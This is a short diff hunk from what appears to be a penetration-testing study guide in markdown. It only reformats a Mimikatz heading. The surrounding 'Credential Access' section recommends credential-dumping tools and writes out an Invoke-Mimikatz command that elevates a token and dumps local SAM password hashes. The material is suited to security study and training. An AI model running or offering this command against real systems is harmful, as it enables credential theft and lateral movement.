@@ -191,7 +191,8 @@ winPEASx64.exe
 ```
 ## Credential Access 
 I would recommend becoming familiar with different tooling that can be used to dump creds. 
-### Mimikatz "privilege::debug" grants account SeDebugPrivilege
+### Mimikatz 
+"privilege::debug" grants account SeDebugPrivilege
 ```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
 
